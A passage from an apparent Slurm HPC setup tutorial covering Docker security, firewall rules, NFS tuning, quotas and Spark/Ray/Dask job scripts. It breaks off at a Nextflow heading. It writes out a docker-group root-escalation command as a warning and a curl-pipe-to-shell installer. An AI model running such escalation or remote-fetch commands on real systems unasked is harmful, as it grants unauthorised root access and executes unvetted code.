<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>warning</div><div class="admonitionContent_BuS1"><p><strong>Critical</strong>: The munge key must be identical on all nodes and have proper permissions (0400, owned by munge<!-- -->:munge<!-- -->).</p></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="docker-security">Docker Security<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#docker-security" class="hash-link" aria-label="Direct link to Docker Security" title="Direct link to Docker Security" translate="no">​</a></h3>
<div class="theme-admonition theme-admonition-danger admonition_xJq3 alert alert--danger"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>danger</div><div class="admonitionContent_BuS1"><p><strong>Critical Security Issue</strong>: Users in the <code>docker</code> group can gain root privileges!</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># DON'T DO THIS (unless they're admins)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">usermod</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-aG</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> regular_user</span><br></span></code></pre></div></div><p>Why? Because they can run:</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /:/hostfs </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--privileged</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> ubuntu </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Now they have root access to the host filesystem!</span><br></span></code></pre></div></div></div></div>
<p><strong>Solutions</strong>:</p>
<ol>
<li class=""><strong>Use Docker Rootless Mode</strong>:</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install rootless docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-fsSL</span><span class="token plain"> https://get.docker.com/rootless </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sh</span><br></span></code></pre></div></div>
<ol start="2">
<li class=""><strong>Use Apptainer/Singularity</strong> (designed for HPC):</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install Apptainer</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> apptainer</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run containers without root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer run docker://ubuntu:latest</span><br></span></code></pre></div></div>
<ol start="3">
<li class=""><strong>Restrict Docker Group</strong>: Only add administrators to docker group</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="firewall-configuration">Firewall Configuration<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#firewall-configuration" class="hash-link" aria-label="Direct link to Firewall Configuration" title="Direct link to Firewall Configuration" translate="no">​</a></h3>
<p>Restrict access to Slurm ports:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Allow Slurm ports only from cluster network</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> ufw allow from </span><span class="token number" style="color:hsl(35, 99%, 36%)">192.168</span><span class="token plain">.58.0/24 to any port </span><span class="token number" style="color:hsl(35, 99%, 36%)">6817</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># slurmctld</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> ufw allow from </span><span class="token number" style="color:hsl(35, 99%, 36%)">192.168</span><span class="token plain">.58.0/24 to any port </span><span class="token number" style="color:hsl(35, 99%, 36%)">6818</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># slurmd</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> ufw allow from </span><span class="token number" style="color:hsl(35, 99%, 36%)">192.168</span><span class="token plain">.58.0/24 to any port </span><span class="token number" style="color:hsl(35, 99%, 36%)">6819</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># slurmdbd</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Allow SSH from anywhere</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> ufw allow </span><span class="token number" style="color:hsl(35, 99%, 36%)">22</span><span class="token plain">/tcp</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Enable firewall</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> ufw </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">enable</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="shared-storage-best-practices">Shared Storage Best Practices<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#shared-storage-best-practices" class="hash-link" aria-label="Direct link to Shared Storage Best Practices" title="Direct link to Shared Storage Best Practices" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="nfs-performance-tuning">NFS Performance Tuning<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#nfs-performance-tuning" class="hash-link" aria-label="Direct link to NFS Performance Tuning" title="Direct link to NFS Performance Tuning" translate="no">​</a></h3>
<p>Optimize NFS for your workload:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># /etc/fstab on compute nodes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">controller-01:/home /home nfs4 rw,soft,rsize</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">262144</span><span class="token plain">,wsize</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">262144</span><span class="token plain">,timeo</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">14</span><span class="token plain">,intr </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><br></span></code></pre></div></div>
<p>Parameters explained:</p>
<ul>
<li class=""><code>soft</code>: Timeout after retry (vs <code>hard</code> which waits forever)</li>
<li class=""><code>rsize/wsize</code>: Read/write buffer size (larger = better performance)</li>
<li class=""><code>timeo</code>: Timeout value</li>
<li class=""><code>intr</code>: Allow interrupts</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="storage-layout">Storage Layout<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#storage-layout" class="hash-link" aria-label="Direct link to Storage Layout" title="Direct link to Storage Layout" translate="no">​</a></h3>
<p>Recommended directory structure:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">/home/          # User home directories (SSD/NVMe)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ├─ alice/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ├─ bob/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  └─ charlie/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">/mnt/data/      # Large datasets (HDD or object storage)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ├─ shared/    # Common datasets</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ├─ projects/  # Project-specific data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  └─ scratch/   # Temporary data (auto-cleanup)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">/opt/           # Shared software/modules</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ├─ anaconda/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ├─ modules/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  └─ apps/</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="quotas">Quotas<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#quotas" class="hash-link" aria-label="Direct link to Quotas" title="Direct link to Quotas" translate="no">​</a></h3>
<p>Prevent users from filling up shared storage:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Set user quotas</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> setquota </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> alice 50G 60G </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> /home</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> setquota </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> alice 500G 550G </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> /mnt/data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check quotas</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">quota</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> alice</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View all quotas</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> repquota </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="integration-with-data-processing-frameworks">Integration with Data Processing Frameworks<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#integration-with-data-processing-frameworks" class="hash-link" aria-label="Direct link to Integration with Data Processing Frameworks" title="Direct link to Integration with Data Processing Frameworks" translate="no">​</a></h2>
<p>One of Slurm's greatest strengths is integration with modern computing frameworks:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="apache-spark">Apache Spark<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#apache-spark" class="hash-link" aria-label="Direct link to Apache Spark" title="Direct link to Apache Spark" translate="no">​</a></h3>
<p>Submit Spark jobs to Slurm:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --job-name=spark-job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --nodes=4</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --ntasks-per-node=1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --cpus-per-task=8</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --mem=32G</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Load Spark module</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">module load spark/3.5.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run Spark application</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">spark-submit </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--master</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">yarn</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  --num-executors </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  --executor-cores </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  --executor-memory 28G </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  my_spark_app.py</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ray-distributed-ml">Ray (Distributed ML)<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#ray-distributed-ml" class="hash-link" aria-label="Direct link to Ray (Distributed ML)" title="Direct link to Ray (Distributed ML)" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --job-name=ray-job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --nodes=2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --ntasks-per-node=1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --cpus-per-task=16</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --gpus-per-node=2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Start Ray cluster</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ray start </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--port</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">6379</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--nodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--ntasks</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> ray start </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--address</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$HEAD_NODE</span><span class="token plain">:6379</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run Ray application</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python ray_train.py</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="dask">Dask<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#dask" class="hash-link" aria-label="Direct link to Dask" title="Direct link to Dask" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> dask_jobqueue </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> SLURMCluster</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> dask</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">distributed </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Client</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">cluster </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> SLURMCluster</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cores</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    memory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"16GB"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    processes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    walltime</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"02:00:00"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    queue</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"compute"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">cluster</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">scale</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">jobs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">10</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Request 10 jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">client </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Client</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cluster</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Your Dask code here</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="nextflow-bioinformatics">Nextflow (Bioinformatics)<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#nextflow-bioinformatics" class="hash-link" aria-label="Direct link to Nextflow (Bioinformatics)" title="Direct link to Nextflow (Bioinformatics)" translate="no">​</a></h3>
